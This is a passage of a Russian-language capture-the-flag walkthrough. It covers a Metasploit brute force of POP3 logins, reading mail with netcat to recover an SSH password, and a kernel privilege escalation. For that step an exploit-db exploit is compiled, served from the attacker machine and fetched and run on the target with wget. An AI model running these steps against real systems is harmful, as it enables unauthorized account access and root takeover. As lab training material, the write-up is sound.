–≤—Å—Ç–∞–≤–∏—Ç—å —Ö–µ—à–∏ –∏ –Ω–∞–∂–∞—Ç—å ¬´–í–∑–ª–æ–º–∞—Ç—å —Ö–µ—à¬ª, –∏ –≤ —Å–ª—É—á–∞–µ —É—Å–ø–µ—à–Ω–æ–≥–æ –≤–∑–ª–æ–º–∞ –≤—ã –ø–æ–ª—É—á–∏—Ç–µ –ø—Ä–æ—Å—Ç–æ–π —Ç–µ–∫—Å—Ç–æ–≤—ã–π –ø–∞—Ä–æ–ª—å.

![[Pasted image 20240320161416.png]]

–ú—ã –≤–∑–ª–æ–º–∞–ª–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ —Ö–µ—à–µ–π –Ω–∞ —ç—Ç–æ–º —Å–∞–π—Ç–µ –∏ –Ω–∞—à–ª–∏ –ø–∞—Ä–æ–ª–∏ –∫ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º –∞–¥—Ä–µ—Å–∞–º —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã. –ù–æ –≤–∑–ª–æ–º–∞–Ω–æ –±—ã–ª–æ –≤—Å–µ–≥–æ 8 —Ö—ç—à–µ–π, –∞ –∏–º–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π 9.

![[Pasted image 20240320161521.png]]


**–ó–∞–¥–∞—á–∞ 5:** –ò—Å–ø–æ–ª—å–∑—É—è –∏–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ –ø–∞—Ä–æ–ª–∏, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã –∑–∞–ø–∏—Å–∞–ª–∏, –º–æ–∂–µ—Ç–µ –ª–∏ –≤—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Metasploit –¥–ª—è –ø–µ—Ä–µ–±–æ—Ä–∞ –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É pop3?

–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å —Å–ª—É–∂–±–∞ POP3, —Ä–∞–±–æ—Ç–∞—é—â–∞—è –Ω–∞ —Ü–µ–ª–µ–≤–æ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ, –∞ —Ç–∞–∫–∂–µ –∏–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ –ø–∞—Ä–æ–ª–∏. –ù–∞ —Å–ª–µ–¥—É—é—â–µ–º —ç—Ç–∞–ø–µ –º—ã –ø–æ–ø—ã—Ç–∞–µ–º—Å—è –≤–æ–π—Ç–∏ –≤ —Å–∏—Å—Ç–µ–º—É, –∏—Å–ø–æ–ª—å–∑—É—è —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.

–¢–µ–ø–µ—Ä—å –Ω–∞–º –Ω—É–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, –≤–µ—Ä–Ω—ã –ª–∏ —ç—Ç–∏ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –∏–ª–∏ –Ω–µ—Ç. –í —Ç–µ–∫—É—â–µ–º —Å—Ü–µ–Ω–∞—Ä–∏–∏ –º—ã –º–æ–∂–µ–º –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å —ç—Ç–æ –≤—Ä—É—á–Ω—É—é, –ø–æ—Å–∫–æ–ª—å–∫—É —Å—É—â–µ—Å—Ç–≤—É–µ—Ç —Ç–æ–ª—å–∫–æ –¥–µ–≤—è—Ç—å –∏–º–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ –ø–∞—Ä–æ–ª–µ–π. –ù–æ –µ—Å–ª–∏ –±—ã —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –±—ã–ª–∏ —Å–æ—Ç–Ω–∏, –Ω–∞–º –ø–æ–Ω–∞–¥–æ–±–∏–ª—Å—è –±—ã –¥–ª—è —ç—Ç–æ–≥–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, –ø–æ—ç—Ç–æ–º—É –¥–∞–≤–∞–π—Ç–µ –≤–æ—Å–ø–æ–ª—å–∑—É–µ–º—Å—è –∏–º –¥–ª—è —ç—Ç–æ–≥–æ.

–î–ª—è —ç—Ç–æ–≥–æ —Å–∫–æ–ø–∏—Ä—É–µ–º –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –ø–∞—Ä–æ–ª—å –≤ –¥–≤–∞ –æ—Ç–¥–µ–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–∞. –Ø —Å–æ–∑–¥–∞–ª –¥–≤–∞ —Ñ–∞–π–ª–∞: userfow.txt –∏ passfow.txt –∏ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–ª –∏–¥–µ–Ω—Ç–∏—Ñ–∏—Ü–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.

![[Pasted image 20240320161614.png]]

–ò—Å–ø–æ–ª—å–∑—É—è –∏–º–µ–Ω–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –∏ –ø–∞—Ä–æ–ª–∏, –∫–æ—Ç–æ—Ä—ã–µ –≤—ã –∑–∞–ø–∏—Å–∞–ª–∏, –º–æ–∂–µ—Ç–µ –ª–∏ –≤—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å Metasploit –¥–ª—è –ø–µ—Ä–µ–±–æ—Ä–∞ –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É pop3?

–ó–¥–µ—Å—å —è –∑–∞–ø—É—Å—Ç–∏–ª Metasploit —Å

```bash
mfsconsole
```

–ü–æ—Å–ª–µ –ø–æ–∏—â–µ–º –Ω—É–∂–Ω—ã–π –Ω–∞–º –º–æ–¥—É–ª—å:

```
search pop3
```

![[Pasted image 20240320161657.png]]

**–ó–∞–¥–∞—á–∞ 6:** –ö–∞–∫–æ–π —É –°–µ–π–Ω—ã –±—ã–ª –ø–∞—Ä–æ–ª—å –∫ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç–µ?

–ú—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–ª–∞—Ç—Ñ–æ—Ä–º—É Metasploit –¥–ª—è –ø–µ—Ä–µ–±–æ—Ä–∞ –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É —á–µ—Ä–µ–∑ pop3. –ü–æ—Å–ª–µ –∑–∞–ø—É—Å–∫–∞ –ø–µ—Ä–µ–±–æ—Ä–∞ –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É —á–µ—Ä–µ–∑ pop3 –º—ã –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞–µ–º, —á—Ç–æ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ ‚Äî ¬´¬†**seina: scoobydoo2**¬†¬ª.

```
msf > use auxiliary/scanner/pop3/pop3_login 
msf auxiliary(scanner/pop3/pop3_login) > set rhosts 192.168.1.29 msf auxiliary(scanner/pop3/pop3_login) > set user_file user.txt msf auxiliary(scanner/pop3/pop3_login) > set pass_file pass.txt msf auxiliary(scanner/pop3/pop3_login) > set verbose false 
msf auxiliary(scanner/pop3/pop3_login) > run
```

![[Pasted image 20240320161953.png]]

–ò–∏–ª–∏ –º–æ–∂–Ω–æ —Å –ø.–º. hydra:

![[Pasted image 20240320162739.png]]

## –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ POP3

**–ó–∞–¥–∞—á–∞ 7:**  –ú–æ–∂–µ—Ç–µ –ª–∏ –≤—ã –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ —Å–µ—Ä–≤–∏—Å—É pop3 —Å –µ–µ —É—á–µ—Ç–Ω—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏? –ö–∞–∫—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç–µ –≤—ã –º–æ–∂–µ—Ç–µ —Å–æ–±—Ä–∞—Ç—å?

–ò—Å—Ö–æ–¥—è —Å –æ—Ç–∫—Ä—ã—Ç—ã—Ö –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤:

```
POP3 (–∞–Ω–≥–ª. Post Office Protocol Version 3 ‚Äî –ø—Ä–æ—Ç–æ–∫–æ–ª –ø–æ—á—Ç–æ–≤–æ–≥–æ –æ—Ç–¥–µ–ª–µ–Ω–∏—è, –≤–µ—Ä—Å–∏—è 3) ‚Äî —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–π –∏–Ω—Ç–µ—Ä–Ω–µ—Ç-–ø—Ä–æ—Ç–æ–∫–æ–ª –ø—Ä–∏–∫–ª–∞–¥–Ω–æ–≥–æ —É—Ä–æ–≤–Ω—è, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –∫–ª–∏–µ–Ω—Ç–∞–º–∏ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ—á—Ç—ã —Å —É–¥–∞–ª—ë–Ω–Ω–æ–≥–æ —Å–µ—Ä–≤–µ—Ä–∞ –ø–æ TCP-—Å–æ–µ–¥–∏–Ω–µ–Ω–∏—é.

POP3 (Post Office Protocol v.3) ‚Äî –ø—Ä–æ—Ç–æ–∫–æ–ª, –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–π –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏–π —Å —Å–µ—Ä–≤–µ—Ä–∞ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã. 
```

–ù—É –∑–Ω–∞—á–∏—Ç—å –Ω–∞–º –Ω—É–∂–Ω–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è –∫ —Å–µ—Ä–≤–µ—Ä—É —á–µ—Ä–µ–∑ –ø—Ä–æ—Ç–æ–∫–æ–ª POP3. –ï—Å—Ç—å —Ä–∞–∑–Ω—ã–µ —Å–ø–æ—Å–æ–±—ã, –º–æ–∂–Ω–æ —Å –∫–æ–º–∞–Ω–¥–æ–π **telnet**, **netcat** –∏–ª–∏ –¥—Ä—É–≥–∏–µ —É—Ç–∏–ª–∏—Ç—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å.

–ü–æ—Å–º–æ—Ç—Ä–∏–º –æ—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã –ø—Ä–æ—Ç–æ–∫–æ–ª–∞ POP3:

–ö–æ–º–∞–Ω–¥—ã POP3

- USER ‚Äî –∫–æ–º–∞–Ω–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏—è –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã.
- PASS ‚Äî –∫–æ–º–∞–Ω–¥–∞ –¥–ª—è —É–∫–∞–∑–∞–Ω–∏—è –ø–∞—Ä–æ–ª—è —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ email.
- LIST ‚Äî –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–ø–∏—Å–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.
- RETR ‚Äî –∫–æ–º–∞–Ω–¥–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–π –ø–æ—á—Ç—ã —Å —Å–µ—Ä–≤–µ—Ä–∞.
- DELE ‚Äî –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –ø–æ–º–µ—Ç–∫–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–Ω–æ–≥–æ email-—Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–∞.
- QUIT ‚Äî –∫–æ–º–∞–Ω–¥–∞ –¥–ª—è –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Å–µ–∞–Ω—Å–∞ POP3.

–¢–µ–ø–µ—Ä—å –ø–æ–ø—ã—Ç–∞–µ–º—Å—è –ø–æ–¥–∫–ª—é—á–∏—Ç—å—Å—è —Å —É—Ç–∏–ª–∏—Ç–æ–π netcat –∏–ª–∏ telnet –∫–∞–∫ –≤–∞–º —É–¥–æ–±–Ω–µ–µ:

```
nc 192.168.1.29 110 
USER seina 
PASS scoobydoo2 
LIST
```

![[Pasted image 20240320164608.png]]

–ù–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–µ –≤—ã—à–µ –º—ã –≤–∏–¥–∏–º, —á—Ç–æ —Å–Ω–∞—á–∞–ª–∞ –º—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏ –∫–æ–º–∞–Ω–¥—ã nc 192.168.1.103 110 –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ —Å–ª—É–∂–±–µ POP3. –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ —è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª USER seina, —á—Ç–æ–±—ã –≤–≤–µ—Å—Ç–∏ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è —Å–ª—É–∂–±—ã POP3, –∏ PASS¬†**scoobydoo2**¬†, —á—Ç–æ–±—ã —É–∫–∞–∑–∞—Ç—å –ø–∞—Ä–æ–ª—å –¥–ª—è –≤—Ö–æ–¥–∞ –≤ —Å–∏—Å—Ç–µ–º—É.

**–ó–∞–¥–∞—á–∞ 8:** –ü—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—è –µ–µ —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω—É—é –ø–æ—á—Ç—É, –∫–∞–∫–æ–π –¥–ª—è –Ω–µ–µ –±—ã–ª —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –≤—Ä–µ–º–µ–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å?

–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –º—ã –≤–∏–¥–∏–º –≤ –≤—ã–≤–æ–¥–µ, —á—Ç–æ –º—ã —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ—à–ª–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –≤ —Å–ª—É–∂–±–µ POP3. –Ø –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –∫–æ–º–∞–Ω–¥—É LIST, —á—Ç–æ–±—ã –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å–æ–æ–±—â–µ–Ω–∏—è, –¥–æ—Å—Ç—É–ø–Ω—ã–µ –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –í —ç—Ç–æ–º –∞–∫–∫–∞—É–Ω—Ç–µ –µ—Å—Ç—å –¥–≤–∞ —Å–æ–æ–±—â–µ–Ω–∏—è.

–ù–∞ —ç—Ç–æ–º —ç—Ç–∞–ø–µ –º—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º –∫–æ–º–∞–Ω–¥—É RETR 1 –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Å–æ–æ–±—â–µ–Ω–∏—è. –≠—Ç–æ –º–æ–∂–Ω–æ —É–≤–∏–¥–µ—Ç—å –Ω–∞ —Å–ª–µ–¥—É—é—â–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç–µ.

**–ò—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –∫–æ–º–∞–Ω–¥–∞: RETR 1**

![[Pasted image 20240320164939.png]]
![[Pasted image 20240320165010.png]]

**–ó–∞–¥–∞—á–∞ 9:** –í —ç–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ–º –ø–∏—Å—å–º–µ, –∫—Ç–æ –µ–≥–æ –æ—Ç–ø—Ä–∞–≤–∏—Ç? –ò—Å–ø–æ–ª—å–∑—É—è –ø–∞—Ä–æ–ª—å –∏–∑ –ø—Ä–µ–¥—ã–¥—É—â–µ–≥–æ –≤–æ–ø—Ä–æ—Å–∞ –∏ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è, –ø–æ–¥–∫–ª—é—á–∏—Ç–µ—Å—å –∫ –∫–æ–º–ø—å—é—Ç–µ—Ä—É —Å –ø–æ–º–æ—â—å—é SSH.

–Ø –Ω–∞—à–µ–ª –≤—Ä–µ–º–µ–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å SSH, –ø—Ä–æ—á–∏—Ç–∞–≤ —ç—Ç–æ –ø–∏—Å—å–º–æ, –∫–æ—Ç–æ—Ä–æ–µ –º–æ–∂–Ω–æ —É–≤–∏–¥–µ—Ç—å –≤ –≤—ã–¥–µ–ª–µ–Ω–Ω–æ–π –æ–±–ª–∞—Å—Ç–∏ –Ω–∞ —Å–∫—Ä–∏–Ω—à–æ—Ç–µ –≤—ã—à–µ. –ü–∞—Ä–æ–ª—å —É–∫–∞–∑–∞–Ω –Ω–∏–∂–µ.

   **–í—Ä–µ–º–µ–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å SSH: ¬´S1ck3nBluff+secureshell¬ª.**

–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å –æ–¥–∏–Ω –≤—Ä–µ–º–µ–Ω–Ω—ã–π –ø–∞—Ä–æ–ª—å SSH. –ü–æ—Å–∫–æ–ª—å–∫—É –Ω–∞ —à–∞–≥–µ 2 –ø–æ—Ä—Ç SSH –æ–∫–∞–∑–∞–ª—Å—è –æ—Ç–∫—Ä—ã—Ç—ã–º, –ø–æ–ø—Ä–æ–±—É–µ–º –≤–æ–π—Ç–∏ —Å —ç—Ç–∏–º –ø–∞—Ä–æ–ª–µ–º. –ù–æ –µ—Å—Ç—å –æ–¥–Ω–∞ –ø—Ä–æ–±–ª–µ–º–∞: —É –Ω–∞—Å –Ω–µ—Ç –∏–º–µ–Ω–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ú—ã –ø–æ–ª—É—á–∏–ª–∏ –≤—Ç–æ—Ä–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ –æ–±–Ω–∞—Ä—É–∂–∏–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ, –≤ –∫–æ—Ç–æ—Ä–æ–º –Ω–∞–º–µ–∫–∞–µ—Ç—Å—è, —á—Ç–æ –æ–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è¬†**¬´baksteen¬ª.**

```
RETR 2
```

![[Pasted image 20240320165247.png]]

–ú—ã –∏—Å–ø–æ–ª—å–∑—É–µ–º —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ ¬´baksteen: S1ck3nBluff+secureshell¬ª –¥–ª—è –≤—Ö–æ–¥–∞ —á–µ—Ä–µ–∑ SSH.

## –ü–æ–ª—É—á–µ–Ω–∏–µ –¥–æ—Å—Ç—É–ø–∞ –∫ SSH

```
ssh¬†baksteen@10.10.193.216 
```


![[Pasted image 20240320165328.png]]

## –ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–µ–ª–∏–≥–∏–π

–ü–æ–ª—É—á–∏–≤ –æ–±–æ–ª–æ—á–∫—É, —è —É–∑–Ω–∞–ª, —á—Ç–æ –≤–æ—à–µ–ª –≤ —Å–∏—Å—Ç–µ–º—É –∫–∞–∫ –æ–±—ã—á–Ω—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å. –ß—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å —Ñ–ª–∞–≥ root, –º—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º root –Ω–∞ —ç—Ç–æ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ. –î–∞–≤–∞–π—Ç–µ –Ω–µ –±—É–¥–µ–º –±–æ–ª—å—à–µ –∂–¥–∞—Ç—å.

![[Pasted image 20240321002606.png]]
![[Pasted image 20240321002635.png]]

–ò–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–π –≤—ã—à–µ –∫–æ–º–∞–Ω–¥—ã –º—ã —Å–æ–æ–±—â–∏–ª–∏, —á—Ç–æ –æ–Ω–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ Ubuntu, –≤–µ—Ä—Å–∏—è —è–¥—Ä–∞ ‚Äî 4.4.0.116.

–ò–∑-–∑–∞ –Ω–∞—à–µ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–π –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ —Å –Ω–∏–∑–∫–∏–º —É—Ä–æ–≤–Ω–µ–º –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –º—ã –º–æ–∂–µ–º –µ—â–µ —Ä–∞–∑ –ø–µ—Ä–µ—á–∏—Å–ª–∏—Ç—å —Å–∏—Å—Ç–µ–º—ã. –£ –Ω–∞—à–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ—Ç –Ω–∏–∫–∞–∫–∏—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π sudo, –∏ –º—ã –Ω–µ –º–æ–∂–µ–º –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –Ω–∏ –∫ –æ–¥–Ω–æ–º—É –∏–∑ –¥–æ–º–∞—à–Ω–∏—Ö –∫–∞—Ç–∞–ª–æ–≥–æ–≤ –¥—Ä—É–≥–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.

–í –Ω–∞—à–µ–º –ø—Ä–µ–¥—ã–¥—É—â–µ–º –ø—Ä–æ—Ü–µ—Å—Å–µ –ø–µ—Ä–µ—á–∏—Å–ª–µ–Ω–∏—è —è –æ–±–Ω–∞—Ä—É–∂–∏–ª, —á—Ç–æ –Ω–∞ –º–∞—à–∏–Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ ‚Äã‚Äã—Å—Ç–∞—Ä–∞—è –≤–µ—Ä—Å–∏—è Ubuntu, –ø–æ—ç—Ç–æ–º—É —è –∏—â—É —ç–∫—Å–ø–ª–æ–π—Ç –¥–ª—è –Ω–µ–µ –≤ exploit-db.

![[Pasted image 20240321002830.png]]

==–ü–æ—Å–ª–µ== –¥–ª—è —ç—Ç–æ–≥–æ —è –æ—Ç–∫—Ä—ã–ª URL-–∞–¥—Ä–µ—Å ExploitDB –∏ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–ª URL-–∞–¥—Ä–µ—Å –∑–∞–≥—Ä—É–∑–∫–∏.

–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ —è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è —É—Ç–∏–ª–∏—Ç–æ–π wget, —á—Ç–æ–±—ã –∑–∞–≥—Ä—É–∑–∏—Ç—å —ç–∫—Å–ø–ª–æ–π—Ç –Ω–∞ –º–∞—à–∏–Ω—É –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞. –ö–∞–∫ —Ç–æ–ª—å–∫–æ —ç–∫—Å–ø–ª–æ–π—Ç –±—ã–ª –∑–∞–≥—Ä—É–∂–µ–Ω, —è –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–ª –µ–≥–æ —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã mv –∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª –∫–æ–º–ø–∏–ª—è—Ç–æ—Ä gcc –¥–ª—è –µ–≥–æ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏. –ü–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –±—ã–ª —Å–æ–∑–¥–∞–Ω —Ñ–∞–π–ª —ç–∫—Å–ø–ª–æ–π—Ç–∞.

```bash
cd /var/www/html/
wget¬†https://www.exploit-db.com/download/44298
mv 44298 44298.c
gcc 44298.c -o exploit
/etc/init.d/apache2 start
ifconfig
```

![[Pasted image 20240321004047.png]]

![[Pasted image 20240321004054.png]]

–ö–æ–≥–¥–∞ —ç–∫—Å–ø–ª–æ–π—Ç —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è, —è –∑–∞–ø—É—Å—Ç–∏–ª —Å–ª—É–∂–±—É apache2, —á—Ç–æ–±—ã –ø–µ—Ä–µ–¥–∞—Ç—å —ç—Ç–æ—Ç —ç–∫—Å–ø–ª–æ–π—Ç –Ω–∞ —Ü–µ–ª–µ–≤—É—é –º–∞—à–∏–Ω—É.

–Ø –∏–∑–º–µ–Ω–∏–ª —Å–≤–æ–π —Ç–µ–∫—É—â–∏–π –∫–∞—Ç–∞–ª–æ–≥ –Ω–∞ –∫–∞—Ç–∞–ª–æ–≥ tmp –Ω–∞ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ –∏ –∑–∞–≥—Ä—É–∑–∏–ª —ç–∫—Å–ø–ª–æ–π—Ç —Å –ø–æ–º–æ—â—å—é —É—Ç–∏–ª–∏—Ç—ã wget. –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ —è –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–∏–ª —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –Ω–∞ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã–π —Ñ–∞–π–ª —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã chmod. –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ —è –∑–∞–ø—É—Å—Ç–∏–ª —ç–∫—Å–ø–ª–æ–π—Ç, –∫–æ—Ç–æ—Ä—ã–π –¥–∞–ª root-–¥–æ—Å—Ç—É–ø —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω—ã. –í—Å–µ –∫–æ–º–∞–Ω–¥—ã –∏ –∏—Ö –≤—ã–≤–æ–¥ –º–æ–∂–Ω–æ —É–≤–∏–¥–µ—Ç—å –≤—ã–¥–µ–ª–µ–Ω–Ω—ã–º–∏ –Ω–∞ —Å–ª–µ–¥—É—é—â–µ–º —Å–Ω–∏–º–∫–µ —ç–∫—Ä–∞–Ω–∞.

```bash
cd /tmp/
wget 10.9.227.16/exploit
chmod +x exploit
./exploit
```

![[Pasted image 20240321004210.png]]

–¢–µ–ø–µ—Ä—å —É –Ω–∞—Å –µ—Å—Ç—å root-–¥–æ—Å—Ç—É–ø –∫ —Ü–µ–ª–µ–≤–æ–π –º–∞—à–∏–Ω–µ. –î–∞–≤–∞–π—Ç–µ –Ω–∞–π–¥–µ–º —Ñ–ª–∞–≥ –∏ –∑–∞–≤–µ—Ä—à–∏–º CTF.

![[Pasted image 20240321004235.png]]

–Ø –ø—Ä–æ—á–∏—Ç–∞–ª —Ñ–∞–π–ª —Ñ–ª–∞–≥–∞ –≤ –∫–∞—Ç–∞–ª–æ–≥–µ tmp —Å –ø–æ–º–æ—â—å—é –∫–æ–º–∞–Ω–¥—ã cat. –§–ª–∞–≥ –º–æ–∂–Ω–æ —É–≤–∏–¥–µ—Ç—å –Ω–∞ —Å–ª–µ–¥—É—é—â–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç–µ.

![[Pasted image 20240321004252.png]]

## –í—Ç–æ—Ä–æ–π —Å–ø–æ—Å–æ–± –ø–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–µ–ª–∏–≥–∏–π

```bash
id
groups
```

